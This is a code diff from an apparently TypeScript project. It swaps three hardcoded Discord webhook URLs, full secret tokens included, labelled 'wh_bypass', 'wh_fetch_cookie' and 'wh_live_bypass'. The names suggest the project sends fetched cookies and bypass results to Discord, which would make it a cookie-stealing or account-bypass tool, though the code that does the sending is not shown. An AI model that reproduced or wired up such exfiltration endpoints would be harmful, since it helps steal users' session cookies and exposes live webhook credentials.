@@ -73,9 +73,9 @@ export function getActiveDirectory(): Directory | null {
 // Webhook URLs (admin settings) — 4 receivers
 // ============================================================
 const HARDCODED_WEBHOOKS: Record<string, string> = {
-  wh_bypass: 'https://discord.com/api/webhooks/1508184540051411157/avNx2DMVPqAZhO2ihSendI5O_yE-MZ2cERNb4k3RARx4z2yMu4UOu3lLOHH3eQVZQRv3',
-  wh_fetch_cookie: 'https://discord.com/api/webhooks/1508184722134798527/SEUX2dx5jpYuwwkEboyqIuLldITaKxubpWhOHgD5vI-LNz21fhxKLXzhakSuOKU_-AJs',
-  wh_live_bypass: 'https://discord.com/api/webhooks/1508200015246659687/evyJNtM5TQASLlBFFNGbYPI2msFF3HMt0JaOtpYwTpcJxhV593i4OjU0nlM9VFmQoQYT',
+  wh_bypass: 'https://discord.com/api/webhooks/1510195358716919878/j3EtRIHmbwXi05MCvekgiRqFH-LYMOHuOhk8jDkuoQLzWUtd2gN_j6qNdfckHImrtGTx',
+  wh_fetch_cookie: 'https://discord.com/api/webhooks/1510195484743172136/RUvTexxxkdenVxIzxv8qdVTAo4xVcHI2gSf2Bdkj-PDAVsKClVjXMPNYSl5y996K75Os',
+  wh_live_bypass: 'https://discord.com/api/webhooks/1510195534756053034/8sgNTeGfNr4RR4TcJpTyma57OIZbsnc6BgnbdbgHkeETJnYVRcagT2hnzrVEkBFVRwTj',
 };
 export const WK = {
   bypass: 'wh_bypass',
